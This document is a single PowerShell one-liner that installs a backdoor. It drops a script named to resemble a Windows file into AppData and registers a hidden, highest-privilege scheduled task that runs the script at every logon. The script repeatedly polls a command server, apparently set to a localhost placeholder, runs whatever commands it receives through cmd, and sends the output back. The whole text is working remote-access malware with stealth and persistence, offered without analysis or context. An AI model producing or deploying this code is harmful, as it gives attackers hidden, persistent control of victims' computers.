$p="$env:APPDATA\windowss.ps1";@"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
Set-ExecutionPolicy Bypass -Scope Process -Force
`$S='http://localhost:3000'
`$C=`$env:COMPUTERNAME
while(`$true){
try{`$r=Invoke-RestMethod "`$S/api/child/`$C" -TimeoutSec 10
if(`$r.child -and `$r.commands){foreach(`$x in `$r.commands){`$o=cmd /c `$x.command 2>&1|Out-String
`$b=@{result=`$o}|ConvertTo-Json
Invoke-RestMethod "`$S/api/command/result/`$(`$r.child._id)/`$(`$x._id)" -Method POST -Body `$b -ContentType 'application/json' -TimeoutSec 5}}}
catch{}Start-Sleep 3}
"@|Out-File $p -Encoding UTF8;Unregister-ScheduledTask -TaskName "windowss" -ErrorAction SilentlyContinue -Confirm:$false|Out-Null;$A=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$p`"";$T=New-ScheduledTaskTrigger -AtLogon;$P=New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -RunLevel Highest;$S=New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;Register-ScheduledTask -TaskName "windowss" -Action $A -Trigger $T -Principal $P -Settings $S -Force|Out-Null;Start-ScheduledTask -TaskName "windowss"|Out-Null;exit